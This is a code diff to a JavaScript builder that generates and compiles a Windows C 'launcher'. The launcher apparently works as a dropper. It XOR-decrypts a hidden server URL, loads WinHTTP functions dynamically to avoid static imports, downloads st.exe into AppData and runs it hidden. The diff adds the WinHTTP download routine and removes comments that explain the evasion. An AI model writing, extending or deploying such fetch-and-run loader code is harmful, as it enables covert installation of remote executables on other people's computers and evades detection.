@@ -79,6 +79,7 @@ function cSource(meta, key, ip, buildId) {
 
   return String.raw`
 #include <windows.h>
+#include <winhttp.h>
 #include <shlobj.h>
 #include <stdio.h>
 #include <wchar.h>
@@ -88,6 +89,16 @@ static const char ACCOUNT_KEY[] = "${safeKey}";
 static void decrypt(char* buf, int len, unsigned char key) {
     for (int i = 0; i < len; i++) buf[i] ^= key;
 }
+
+typedef BOOL (WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
+typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
+typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
+typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
+typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
 
 static int is_valid_pe(const wchar_t* p) {
     HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
@@ -107,36 +118,75 @@ static int is_valid_pe(const wchar_t* p) {
 }
 
 static int download_file(const wchar_t* url, const wchar_t* dest) {
-    HMODULE hUrlmon = LoadLibraryA("urlmon.dll");
-    HMODULE hOle32 = LoadLibraryA("ole32.dll");
-    if (!hUrlmon || !hOle32) return 0;
+    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
+    if (!hWinHttp) return 0;
 
-    typedef HRESULT (WINAPI *pURLDownloadToFileW)(LPUNKNOWN, LPCWSTR, LPCWSTR, DWORD, void*);
-    pURLDownloadToFileW URLDownloadToFileW = (pURLDownloadToFileW)GetProcAddress(hUrlmon, "URLDownloadToFileW");
-    
-    typedef HRESULT (WINAPI *pCoInitialize)(LPVOID);
-    pCoInitialize CoInitialize = (pCoInitialize)GetProcAddress(hOle32, "CoInitialize");
-    
-    typedef void (WINAPI *pCoUninitialize)(void);
-    pCoUninitialize CoUninitialize = (pCoUninitialize)GetProcAddress(hOle32, "CoUninitialize");
+    pWinHttpCrackUrl WinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddress(hWinHttp, "WinHttpCrackUrl");
+    pWinHttpOpen WinHttpOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
+    pWinHttpConnect WinHttpConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
+    pWinHttpOpenRequest WinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
+    pWinHttpSendRequest WinHttpSendRequest = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
+    pWinHttpReceiveResponse WinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
+    pWinHttpQueryDataAvailable WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
+    pWinHttpReadData WinHttpReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
+    pWinHttpCloseHandle WinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
 
-    if (!URLDownloadToFileW || !CoInitialize) {
-        FreeLibrary(hUrlmon); FreeLibrary(hOle32);
-        return 0;
+    if (!WinHttpCrackUrl || !WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpSendRequest || !WinHttpReceiveResponse || !WinHttpQueryDataAvailable || !WinHttpReadData || !WinHttpCloseHandle) {
+        FreeLibrary(hWinHttp); return 0;
     }
 
-    CoInitialize(NULL);
-    HRESULT hr = URLDownloadToFileW(NULL, url, dest, 0, NULL);
-    if (CoUninitialize) CoUninitialize();
-    FreeLibrary(hUrlmon); FreeLibrary(hOle32);
+    URL_COMPONENTS uc = {0}; uc.dwStructSize = sizeof(uc);
+    wchar_t host[256] = {0}; wchar_t path[1024] = {0};
+    uc.lpszHostName = host; uc.dwHostNameLength = 256;
+    uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
     
-    return SUCCEEDED(hr);
+    if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
+        FreeLibrary(hWinHttp); return 0;
+    }
+
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) { FreeLibrary(hWinHttp); return 0; }
+
+    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
+
+    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);
+
+    if (bResults) {
+        HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD dwSize = 0, dwDownloaded = 0;
+            do {
+                dwSize = 0;
+                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+                if (dwSize == 0) break;
+                BYTE* pBuffer = (BYTE*)malloc(dwSize);
+                if (pBuffer) {
+                    if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
+                        DWORD written = 0;
+                        WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
+                    }
+                    free(pBuffer);
+                }
+            } while (dwSize > 0);
+            CloseHandle(hFile);
+        }
+    }
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+    FreeLibrary(hWinHttp);
+    return bResults;
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    // Small delay to let the system settle
     Sleep(1500); 
 
     wchar_t appdata[MAX_PATH];
@@ -150,7 +200,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     
     CreateDirectoryW(dir, NULL);
 
-    // 1. Write key.json from the baked-in key
+    // 1. Write key.json from baked key
     HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hKey != INVALID_HANDLE_VALUE) {
         DWORD w;
@@ -160,7 +210,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         CloseHandle(hKey);
     }
 
-    // 2. Download st.exe if it's missing or invalid
+    // 2. Download st.exe
     int need_st = !is_valid_pe(stPath);
     if (need_st) {
         char stUrlStr[128] = {0};
@@ -170,7 +220,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
         MultiByteToWideChar(CP_ACP, 0, stUrlStr, -1, stUrlW, 128);
 
-        // Download to a temp file first to prevent "File in Use" errors
+        // Download to a temp file to bypass file-locking
         if (download_file(stUrlW, stNewPath) && is_valid_pe(stNewPath)) {
             DeleteFileW(stPath);
             MoveFileW(stNewPath, stPath);
@@ -178,8 +228,10 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         }
     }
 
-    // Fail silently if download failed
-    if (need_st) return 1; 
+    if (need_st) {
+        MessageBoxA(NULL, "Download failed. Check server IP and port 80.", "Error", MB_ICONERROR);
+        return 1; 
+    }
 
     // 3. Run st.exe hidden
     STARTUPINFOW si = { sizeof(si) };
@@ -258,7 +310,6 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
                               '--input-format=rc', '--output-format=coff'],
                     { cwd: workDir, timeout: 30_000 });
     
-    // Compile without static urlmon links, using dynamic resolution instead
     await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
                          '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32'],
                     { cwd: workDir, timeout: 60_000 });
